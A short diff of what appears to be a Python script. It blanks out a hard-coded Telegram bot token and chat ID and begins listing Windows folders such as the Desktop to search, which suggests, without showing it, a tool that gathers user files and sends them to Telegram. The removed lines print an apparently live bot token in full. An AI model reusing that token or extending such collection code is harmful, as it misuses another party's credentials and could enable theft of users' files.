@@ -19,8 +19,8 @@ logging.basicConfig(
 logger = logging.getLogger(__name__)
 
 # Bot credentials directly in code
-TELEGRAM_TOKEN = "7241747855:AAGhvZbvb9EVxoMSeZbnphCDR_lR7UqgS_Q"  #  bot token
-CHAT_ID = "1254510341"  #     chat id 
+TELEGRAM_TOKEN = ""  #  set bot token
+CHAT_ID = ""  #    set chat id 
 # Important Windows locations to search
 IMPORTANT_LOCATIONS = [
     os.path.expanduser("~/Desktop"),
